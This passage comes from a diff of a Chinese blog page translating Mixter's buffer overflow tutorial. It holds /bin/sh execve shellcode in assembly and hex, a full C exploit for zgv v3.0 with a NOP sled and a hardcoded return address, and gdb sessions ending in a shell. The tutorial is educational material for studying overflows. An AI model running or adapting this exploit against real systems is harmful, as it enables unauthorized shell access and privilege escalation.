-                        <br>
-                        <span class="line">14</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">main()</span>
-                        <br>
-                        <span class="line">&#123;</span>
-                        <br>
-                        <span class="line">
-                          <span class="keyword">int</span> i=
-                          <span class="number">0</span>;
-                          <span class="keyword">char</span> buf[
-                          <span class="number">44</span>];</span>
-                        <br>
-                        <span class="line">
-                          <span class="keyword">for</span> (i=
-                          <span class="number">0</span>;i&lt;=
-                          <span class="number">40</span>;i+=
-                          <span class="number">4</span>)</span>
-                        <br>
-                        <span class="line"> *(
-                          <span class="keyword">long</span> *) &amp;buf[i] =
-                          <span class="number">0x80484cb</span>;</span>
-                        <br>
-                        <span class="line">
-                          <span class="built_in">puts</span>(buf);</span>
-                        <br>
-                        <span class="line">&#125;</span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor"># ret</span>
-                        </span>
-                        <br>
-                        <span class="line">ËËËËËËËËËËË,</span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor"># (ret;cat)|./blah</span>
-                        </span>
-                        <br>
-                        <span class="line">test &lt;- user input</span>
-                        <br>
-                        <span class="line">ËËËËËËËËËËË,test</span>
-                        <br>
-                        <span class="line">test &lt;- user input</span>
-                        <br>
-                        <span class="line">test</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>我们在这里使用这个程序通过了函数两次。如果有溢出存在，函数的返回值地址是可以变的，从而改变程序的执行线程。</p>
-              <h4 id="4-_Shellcode">4. Shellcode</h4>
-              <p>为了简单，Shellcode使用简单的汇编指令，我们写在栈上，然后更改返回地址，使它返回到栈内。使用这个方法，我们可以我们可以把代码插入到一个脆弱的进程中，然后在栈中正确的执行它。所以，让我们通过插入的汇编代码来运行一个Shell。一个常见的调用命令是execve()，它加载和运行任意的二进制代码，终止执行当前的进程。联机界面给我的应用：</p>
-              <figure class="highlight c">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                        <span class="line">10</span>
-                        <br>
-                        <span class="line">11</span>
-                        <br>
-                        <span class="line">12</span>
-                        <br>
-                        <span class="line">13</span>
-                        <br>
-                        <span class="line">14</span>
-                        <br>
-                        <span class="line">15</span>
-                        <br>
-                        <span class="line">16</span>
-                        <br>
-                        <span class="line">17</span>
-                        <br>
-                        <span class="line">18</span>
-                        <br>
-                        <span class="line">19</span>
-                        <br>
-                        <span class="line">20</span>
-                        <br>
-                        <span class="line">21</span>
-                        <br>
-                        <span class="line">22</span>
-                        <br>
-                        <span class="line">23</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">
-                          <span class="function">
-                            <span class="keyword">int</span>
-                            <span class="title">execve</span>
-                            <span class="params">(
-                              <span class="keyword">const</span>
-                              <span class="keyword">char</span> *filename,
-                              <span class="keyword">char</span> *
-                              <span class="keyword">const</span> argv [],
-                              <span class="keyword">char</span> *
-                              <span class="keyword">const</span> envp[])</span>
-                          </span>; </span>
-                        <br>
-                        <span class="line">Lets get the details of the system call from glibc2: </span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor"># gdb /lib/libc.so
-                            <span class="number">.6</span>
-                          </span>
-                        </span>
-                        <br>
-                        <span class="line">(gdb) disas execve </span>
-                        <br>
-                        <span class="line">Dump of assembler code
-                          <span class="keyword">for</span> function execve: </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da00</span> : pushl %ebx </span>
-                        <br>
-                        <span class="line">
-                          <span class="comment">/* this is the actual syscall. before a program would call
-                            execve, it would </span>
-                          <br>
-                          <span class="line"> push the arguments in reverse order on the stack: **envp,
-                            **argv, *filename */
-                          </span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="comment">/* put address of **envp into edx register */</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da01</span> : movl
-                          <span class="number">0</span>×
-                          <span class="number">10</span>(%esp,
-                          <span class="number">1</span>),%edx </span>
-                        <br>
-                        <span class="line">
-                          <span class="comment">/* put address of **argv into ecx register */</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da05</span> : movl
-                          <span class="number">0xc</span>(%esp,
-                          <span class="number">1</span>),%ecx </span>
-                        <br>
-                        <span class="line">
-                          <span class="comment">/* put address of *filename into ebx register */</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da09</span> : movl
-                          <span class="number">0</span>×
-                          <span class="number">8</span>(%esp,
-                          <span class="number">1</span>),%ebx </span>
-                        <br>
-                        <span class="line">
-                          <span class="comment">/* put 0xb in eax register; 0xb == execve in the internal
-                            system call table */</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da0d</span> : movl $
-                          <span class="number">0xb</span>,%eax </span>
-                        <br>
-                        <span class="line">
-                          <span class="comment">/* give control to kernel, to execute execve instruction
-                            */</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da12</span> :
-                          <span class="keyword">int</span> $
-                          <span class="number">0</span>×
-                          <span class="number">80</span>
-                        </span>
-                        <br>
-                        <span class="line"> </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da14</span> : popl %ebx </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da15</span> : cmpl $
-                          <span class="number">0xfffff001</span>,%eax </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da1a</span> : jae
-                          <span class="number">0x5da1d</span> &lt;__syscall_error&gt; </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x5da1c</span> : ret</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>结束汇编转存。</p>
-              <h4 id="4-1_使代码可移植">4.1 使代码可移植</h4>
-              <p>我们必须应用一个策略使没有参数的Shellcode在内存中的传统方式，通过在它们的页存储上的精确位置，在编译中完成。</p>
-              <p>一旦我们估计shellcode的大小，我们能够使用指令jmp和call来得到指定的字节在执行线程向前或是向后。为什么使用call?我们有机会使用CALL来自动的在栈内存储返回地址，这个返回地址是在下一个CALL指令后的4个字节。通过放置一个正确的变量通过使用call，我们间接的把地址压进了栈中，没有必要了解它。</p>
-              <figure class="highlight">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">0 jmp (skip Z bytes forward) </span>
-                        <br>
-                        <span class="line">2 popl %esi </span>
-                        <br>
-                        <span class="line">… put function(s) here … </span>
-                        <br>
-                        <span class="line">Z call &lt;-Z+2&gt; (skip 2 less than Z bytes backward, to
-                          POPL)
-                        </span>
-                        <br>
-                        <span class="line">Z+5 .string (first variable)</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>(注：如果你要写的代码比一个简单的shell还要复杂，可以多次使用上面的代码。字符串放在代码的后面。你知道这些字符串的大小，因此可以计算他们的相对位置，一旦你知道第一个字符串的位置。)</p>
-              <h4 id="4-2_Shellcode">4.2 Shellcode</h4>
-              <figure class="highlight c">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                        <span class="line">10</span>
-                        <br>
-                        <span class="line">11</span>
-                        <br>
-                        <span class="line">12</span>
-                        <br>
-                        <span class="line">13</span>
-                        <br>
-                        <span class="line">14</span>
-                        <br>
-                        <span class="line">15</span>
-                        <br>
-                        <span class="line">16</span>
-                        <br>
-                        <span class="line">17</span>
-                        <br>
-                        <span class="line">18</span>
-                        <br>
-                        <span class="line">19</span>
-                        <br>
-                        <span class="line">20</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">global code_start
-                          <span class="comment">/* we'll need this later, dont mind it */</span>
-                        </span>
-                        <br>
-                        <span class="line">global code_end </span>
-                        <br>
-                        <span class="line"> .data </span>
-                        <br>
-                        <span class="line">code_start: </span>
-                        <br>
-                        <span class="line"> jmp
-                          <span class="number">0</span>×
-                          <span class="number">17</span>
-                        </span>
-                        <br>
-                        <span class="line"> popl %esi </span>
-                        <br>
-                        <span class="line"> movl %esi,
-                          <span class="number">0</span>×
-                          <span class="number">8</span>(%esi)
-                          <span class="comment">/* put address of **argv behind shellcode, </span>
-                          <br>
-                          <span class="line"> 0×8 bytes behind it so a /bin/sh has place */</span>
-                        </span>
-                        <br>
-                        <span class="line"> xorl %eax,%eax
-                          <span class="comment">/* put 0 in %eax */</span>
-                        </span>
-                        <br>
-                        <span class="line"> movb %eax,
-                          <span class="number">0</span>×
-                          <span class="number">7</span>(%esi)
-                          <span class="comment">/* put terminating 0 after /bin/sh string */</span>
-                        </span>
-                        <br>
-                        <span class="line"> movl %eax,
-                          <span class="number">0xc</span>(%esi)
-                          <span class="comment">/* another 0 to get the size of a long word */</span>
-                        </span>
-                        <br>
-                        <span class="line">my_execve: </span>
-                        <br>
-                        <span class="line"> movb $
-                          <span class="number">0xb</span>,%al
-                          <span class="comment">/* execve( */</span>
-                        </span>
-                        <br>
-                        <span class="line"> movl %esi,%ebx
-                          <span class="comment">/* "/bin/sh", */</span>
-                        </span>
-                        <br>
-                        <span class="line"> leal
-                          <span class="number">0</span>×
-                          <span class="number">8</span>(%esi),%ecx
-                          <span class="comment">/* &amp; of "/bin/sh", */</span>
-                        </span>
-                        <br>
-                        <span class="line"> xorl %edx,%edx
-                          <span class="comment">/* NULL */</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="keyword">int</span> $
-                          <span class="number">0</span>×
-                          <span class="number">80</span>
-                          <span class="comment">/* ); */</span>
-                        </span>
-                        <br>
-                        <span class="line"> call -
-                          <span class="number">0x1c</span>
-                        </span>
-                        <br>
-                        <span class="line"> .
-                          <span class="built_in">string</span>
-                          <span class="string">"/bin/shX"</span>
-                          <span class="comment">/* X is overwritten by movb %eax,0×7(%esi) */</span>
-                        </span>
-                        <br>
-                        <span class="line">code_end:</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>(相对偏移了0x17和-0x1c通过放在0x0，编译，反汇编和看看shell代码的大小。)</p>
-              <p>这是一个正在工作着的shellcode，虽然很小。你至少使用exit()来调用和依附它(在调用之前)。Shellcode的正真的艺术还包括避免任何二进制0代码和修改它为例，二进制代码不包含控制和小写字符，这将会过滤掉一些问题程序。大多数的东西是通过自己修改代码来完成的，就是我们想的使用mov
-                %eax,0×7(%esi)指令。我们用\0来取代X，但是在shellcode初始化中没有\0。
-              </p>
-              <p>让我们测试下这些代码，保存上面的代码为code.S和下面的文件为code.c：</p>
-              <figure class="highlight c">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">
-                          <span class="function">
-                            <span class="keyword">extern</span>
-                            <span class="keyword">void</span>
-                            <span class="title">code_start</span>
-                            <span class="params">()</span>
-                          </span>; </span>
-                        <br>
-                        <span class="line">
-                          <span class="function">
-                            <span class="keyword">extern</span>
-                            <span class="keyword">void</span>
-                            <span class="title">code_end</span>
-                            <span class="params">()</span>
-                          </span>; </span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor">#
-                            <span class="keyword">include</span>
-                            <span class="string">&lt;stdio.h&gt;</span>
-                          </span>
-                        </span>
-                        <br>
-                        <span class="line">main() &#123; ((
-                          <span class="keyword">void</span> (*)(
-                          <span class="keyword">void</span>)) code_start)(); &#125;</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor"># cc -o code code.S code.c</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor"># ./code</span>
-                        </span>
-                        <br>
-                        <span class="line">bash
-                          <span class="preprocessor">#</span>
-                        </span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>现在你可以把shellcode转变成16进制字符缓冲区。要做到这的最好的方法就是打印：</p>
-              <figure class="highlight c">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">
-                          <span class="preprocessor">#
-                            <span class="keyword">include</span>
-                            <span class="string">&lt;stdio.h&gt;</span>
-                          </span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="function">
-                            <span class="keyword">extern</span>
-                            <span class="keyword">void</span>
-                            <span class="title">code_start</span>
-                            <span class="params">()</span>
-                          </span>;
-                          <span class="function">
-                            <span class="keyword">extern</span>
-                            <span class="keyword">void</span>
-                            <span class="title">code_end</span>
-                            <span class="params">()</span>
-                          </span>;</span>
-                        <br>
-                        <span class="line">main() &#123;
-                          <span class="built_in">fprintf</span>(
-                          <span class="built_in">stderr</span>,
-                          <span class="string">"%s"</span>,code_start);</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>通过使用aconv –h或bin2c.pl来解析它，可以在
-                <a href="http://www.dec.net/~dhg或是http://members.tripod.com/mixtersecurity上找到工具。"
-                target="_blank" rel="external">http://www.dec.net/~dhg或是http://members.tripod.com/mixtersecurity上找到工具。</a>
-              </p>
-              <h4 id="5_写一个例子">5 写一个例子</h4>
-              <p>让我们看看如何改变返回地址指向的shellcode进行压栈，写一个攻击的例子。我们将要采用zgv，因为这是可以利用的一个最简单的事情。</p>
-              <figure class="highlight">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line"># export HOME=`perl -e 'printf "a" x 2000'`</span>
-                        <br>
-                        <span class="line"># zgv</span>
-                        <br>
-                        <span class="line">Segmentation fault (core dumped) </span>
-                        <br>
-                        <span class="line"># gdb /usr/bin/zgv core</span>
-                        <br>
-                        <span class="line">#0 0×61616161 in ?? ()</span>
-                        <br>
-                        <span class="line">(gdb) info register esp </span>
-                        <br>
-                        <span class="line"> esp: 0xbffff574 -1073744524</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>那么，这是在栈顶的故障时间，安全的假设是我们能够使用这作为我们shellcode的返回地址。</p>
-              <p>现在我们要在我们的缓冲区前增加一些NOP指令，所以我们没有必要对于我们内存中的shellcode的精确开始的预测100%的正确。这个函数将会返回到栈在我们的shellcode之前，通过这个方式使用NOPs的头文字JMP命令，跳转到CALL，在转回popl，在栈中运行我们的代码。</p>
-              <p>记住，栈是这样的。在最低级的内存地址，ESP指向栈的顶部，初始变量被储存，即时缓冲器中的zgv储存了HOME环境变量。在那之后，我们保存了EBP和前一个函数的返回地址。我们必须要写8个字节或是更多在缓冲区后面，用栈中的新的地址来覆盖返回地址。</p>
-              <p>Zgv缓冲器有1024个字节。你可以通过扫视代码来发现，或是通过在脆弱的函数中搜索初始化的subl $0×400,%esp (=1024)。我们可以把这些放在一起来利用。</p>
-              <h4 id="5-1_zgv攻击实例">5.1 zgv攻击实例</h4>
-              <figure class="highlight">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                        <span class="line">10</span>
-                        <br>
-                        <span class="line">11</span>
-                        <br>
-                        <span class="line">12</span>
-                        <br>
-                        <span class="line">13</span>
-                        <br>
-                        <span class="line">14</span>
-                        <br>
-                        <span class="line">15</span>
-                        <br>
-                        <span class="line">16</span>
-                        <br>
-                        <span class="line">17</span>
-                        <br>
-                        <span class="line">18</span>
-                        <br>
-                        <span class="line">19</span>
-                        <br>
-                        <span class="line">20</span>
-                        <br>
-                        <span class="line">21</span>
-                        <br>
-                        <span class="line">22</span>
-                        <br>
-                        <span class="line">23</span>
-                        <br>
-                        <span class="line">24</span>
-                        <br>
-                        <span class="line">25</span>
-                        <br>
-                        <span class="line">26</span>
-                        <br>
-                        <span class="line">27</span>
-                        <br>
-                        <span class="line">28</span>
-                        <br>
-                        <span class="line">29</span>
-                        <br>
-                        <span class="line">30</span>
-                        <br>
-                        <span class="line">31</span>
-                        <br>
-                        <span class="line">32</span>
-                        <br>
-                        <span class="line">33</span>
-                        <br>
-                        <span class="line">34</span>
-                        <br>
-                        <span class="line">35</span>
-                        <br>
-                        <span class="line">36</span>
-                        <br>
-                        <span class="line">37</span>
-                        <br>
-                        <span class="line">38</span>
-                        <br>
-                        <span class="line">39</span>
-                        <br>
-                        <span class="line">40</span>
-                        <br>
-                        <span class="line">41</span>
-                        <br>
-                        <span class="line">42</span>
-                        <br>
-                        <span class="line">43</span>
-                        <br>
-                        <span class="line">44</span>
-                        <br>
-                        <span class="line">45</span>
-                        <br>
-                        <span class="line">46</span>
-                        <br>
-                        <span class="line">47</span>
-                        <br>
-                        <span class="line">48</span>
-                        <br>
-                        <span class="line">49</span>
-                        <br>
-                        <span class="line">50</span>
-                        <br>
-                        <span class="line">51</span>
-                        <br>
-                        <span class="line">52</span>
-                        <br>
-                        <span class="line">53</span>
-                        <br>
-                        <span class="line">54</span>
-                        <br>
-                        <span class="line">55</span>
-                        <br>
-                        <span class="line">56</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">/* zgv v3.0 exploit by Mixter </span>
-                        <br>
-                        <span class="line"> buffer overflow tutorial – http://1337.tsx.org </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line"> sample exploit, works for example with precompiled </span>
-                        <br>
-                        <span class="line"> redhat 5.x/suse 5.x/redhat 6.x/slackware 3.x linux binaries
-                          */ </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">#include &lt;stdio.h&gt;</span>
-                        <br>
-                        <span class="line">#include &lt;unistd.h&gt;</span>
-                        <br>
-                        <span class="line">#include &lt;stdlib.h&gt;</span>
-                        <br>
-                        <span class="line"> </span>
-                        <br>
-                        <span class="line">/* This is the minimal shellcode from the tutorial */ </span>
-                        <br>
-                        <span class="line">static char shellcode[]= </span>
-                        <br>
-                        <span class="line">"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"</span>
-                        <br>
-                        <span class="line">"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">#define NOP 0×90</span>
-                        <br>
-                        <span class="line">#define LEN 1032</span>
-                        <br>
-                        <span class="line">#define RET 0xbffff574</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">int main() </span>
-                        <br>
-                        <span class="line">&#123; </span>
-                        <br>
-                        <span class="line"> char buffer[LEN]; </span>
-                        <br>
-                        <span class="line"> long retaddr = RET; </span>
-                        <br>
-                        <span class="line"> int i; </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">fprintf(stderr,"using address 0x%lx\n",retaddr); </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* this fills the whole buffer with the return address, see
-                          3b) */
-                        </span>
-                        <br>
-                        <span class="line">for (i=0;i&lt;LEN;i+=4) </span>
-                        <br>
-                        <span class="line"> *(long *)&amp;buffer[i] = retaddr; </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* this fills the initial buffer with NOP's, 100 chars less
-                          than the </span>
-                        <br>
-                        <span class="line"> buffer size, so the shellcode and return address fits in
-                          comfortably */
-                        </span>
-                        <br>
-                        <span class="line">for (i=0;i&lt;LEN-strlen(shellcode)-100);i++) </span>
-                        <br>
-                        <span class="line"> *(buffer+i) = NOP; </span>
-                        <br>
-                        <span class="line"> </span>
-                        <br>
-                        <span class="line">/* after the end of the NOPs, we copy in the execve() shellcode
-                          */
-                        </span>
-                        <br>
-                        <span class="line">memcpy(buffer+i,shellcode,strlen(shellcode)); </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* export the variable, run zgv */</span>
-                        <br>
-                        <span class="line">setenv("HOME", buffer, 1); </span>
-                        <br>
-                        <span class="line">execlp("zgv","zgv",NULL); </span>
-                        <br>
-                        <span class="line">return 0; </span>
-                        <br>
-                        <span class="line">&#125;</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* EOF */ </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">We now have a string looking like this:</span>
-                        <br>
-                        <span class="line">[ ... NOP NOP NOP NOP NOP JMP SHELLCODE CALL /bin/sh RET
-                          RET RET RET RET RET ] </span>
-                        <br>
-                        <span class="line">While zgv's stack looks like this: </span>
-                        <br>
-                        <span class="line">v– 0xbffff574 is here </span>
-                        <br>
-                        <span class="line">[ S M A L L B U F F E R ] [SAVED EBP] [ORIGINAL RET] </span>
-                        <br>
-                        <span class="line"> </span>
-                        <br>
-                        <span class="line">The execution thread of zgv is now as follows: </span>
-                        <br>
-                        <span class="line"> </span>
-                        <br>
-                        <span class="line">main … -&gt; function() -&gt; strcpy(smallbuffer,getenv("HOME"));</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>此时，zgv做不到边界检查，写入超出了smallbuffer，返回到main的地址被栈中的返回地址覆盖。function()离不开/
-                ret和栈中EIP的指向。</p>
-              <figure class="highlight c">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                        <span class="line">10</span>
-                        <br>
-                        <span class="line">11</span>
-                        <br>
-                        <span class="line">12</span>
-                        <br>
-                        <span class="line">13</span>
-                        <br>
-                        <span class="line">14</span>
-                        <br>
-                        <span class="line">15</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">
-                          <span class="number">0xbffff574</span> nop</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0xbffff575</span> nop</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0xbffff576</span> nop</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0xbffff577</span> jmp $
-                          <span class="number">0</span>×
-                          <span class="number">24</span>
-                          <span class="number">1</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0xbffff579</span> popl %esi
-                          <span class="number">3</span> &lt;–\ |</span>
-                        <br>
-                        <span class="line">[... shellcode starts here ...] | |</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0xbffff59b</span> call -$
-                          <span class="number">0x1c</span>
-                          <span class="number">2</span> &lt;–/</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0xbffff59e</span> .
-                          <span class="built_in">string</span>
-                          <span class="string">"/bin/shX"</span>
-                        </span>
-                        <br>
-                        <span class="line"> </span>
-                        <br>
-                        <span class="line">Lets test the exploit… </span>
-                        <br>
-                        <span class="line"> </span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor"># cc -o zgx zgx.c </span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="preprocessor"># ./zgx </span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="keyword">using</span> address
-                          <span class="number">0xbffff574</span>
-                        </span>
-                        <br>
-                        <span class="line">bash
-                          <span class="preprocessor">#</span>
-                        </span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <h4 id="5-2_编写攻击的进一步提示">5.2 编写攻击的进一步提示</h4>
-              <p>有很都可以被利用的程序，但还是很脆弱。但是这有很多的技巧，你可以通过过滤等方式得到。还有其他的溢出技术，这并不一定要包括改变返回地址或是只是放回地址。有指针溢出，函数分配的指针能够被覆盖通过一个数据流，改变程序执行的流程。攻击的返回地址指向shell环境指针，shellcode为与那里，而不是在栈上。</p>
-              <p>对于一个熟练掌握shellcode的人是在根本上的自己修改代码，最初包含可以打印的，非白色的大写字母，然后修改自己它，把shellcode函数放在要执行的栈上。</p>
-              <p>你应该永远不会有任何二进制0在你的shell代码里，因为如果它包含任何都可能无法正常的工作。但是本文讨论了怎么升华某种汇编指令与其他的命令超出了范围。我也建议读其他大的数据流怎么超出的，通过aleph1，Taeoh
-                Oh和mudge来写的。
-              </p>
-              <h4 id="5-3_重要注意事项">5.3 重要注意事项</h4>
-              <p>你将不能在Windows 或是 Macintosh上使用这个教程，不要和我要cc.exe和gdb.exe。</p>
-              <h4 id="6_结论">6 结论</h4>
-              <p>我们已经知道，一旦用户依赖存在的溢出，在90%的时间了是可以利用的，即使利用起来很困难，同时要一些技能。为什么写这个攻击很重要呢?因为软件企业是无知的。在软件缓冲区溢出方面的漏洞报告已经有了，虽然这些软件没有更新，或是大多数用户没有更新，因为这个漏洞很难被利用，没有人认为这会成为一个安全隐患。然后，漏洞出现了，证明和实践是程序能够利用，而且这就要急于更新了。</p>
-              <p>作为程序员，写一个安全的程序是一个艰巨的任务，但是要认真的对待。在写入服务器时就变的更加值得关注，任何类型的安全程序，或是suid root的程序，或是设计使用root来运行，如特别的账户或是系统本身。使用范围检查，更喜欢分配动态缓冲器，输入的依赖性，大小，小心/while/etc。收集数据和填充缓冲区，以及一般处理用户很关心的输入的循环是我建议的主要原则。</p>
-              <p>目前在安全行业取得了显著的成绩，使用非可执行的栈，suid包，防卫程序来核对返回值，边界核查编辑器等技术来阻止溢出问题。你应该在可以使用的情况下使用这些技术，但是不要完全依赖他们。如果你运行vanilla的UNIX的发行版时，不要假设安全，但是有溢出保护或是防火墙/IDS。它不能保证安全，如果你继续使用不安全的程序，因为
-                <em>all</em>安全程序是
-                <em>software</em>和包含自身漏洞的，至少他们不是完美的。如果你频繁的使用updates
-                <em>和</em> security measures，你仍然不能渴望安全，
-                <em>but</em>你可以希望。</p>
-
-            </div>
-
-          </div>
-
-          <nav id="article-nav">
-
-            <a href="/2014/07/31/Android-WebView内存泄漏/" id="article-nav-newer" class="article-nav-link-wrap">
-              <strong class="article-nav-caption">
-                <</strong>
-                  <div class="article-nav-title">
-
-                    Android WebView内存泄漏
-
-                  </div>
-            </a>
-
-            <a href="/2014/06/14/如何成为一个偷懒又高效的Android开发人员/" id="article-nav-older" class="article-nav-link-wrap">
-              <div class="article-nav-title">如何成为一个偷懒又高效的Android开发人员 </div>
-              <strong class="article-nav-caption">></strong>
-            </a>
-
-          </nav>
-
-        </article>
-
-        <div class="share">
-          <!-- JiaThis Button BEGIN -->
-          <div class="jiathis_style">
-            <span class="jiathis_txt">分享到：</span>
-            <a class="jiathis_button_tsina"></a>
-            <a class="jiathis_button_cqq"></a>
-            <a class="jiathis_button_douban"></a>
-            <a class="jiathis_button_weixin"></a>
-            <a class="jiathis_button_tumblr"></a>
-            <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis"
-            target="_blank"></a>
-          </div>
-          <script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953"
-          charset="utf-8"></script>
-          <!-- JiaThis Button END -->
-        </div>
-
-        <div class="duoshuo">
-          <!-- 多说评论框 start -->
-          <div class="ds-thread" data-thread-key="缓冲区溢出攻击" data-title="缓冲区溢出攻击" data-url="http://science09.github.io/2014/07/31/缓冲区溢出攻击/"></div>
-          <!-- 多说评论框 end -->
-          <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
-          <script type="text/javascript">
-            var duoshuoQuery = {
-              short_name: "true"
-            };
-            (function() {
-              var ds = document.createElement('script');
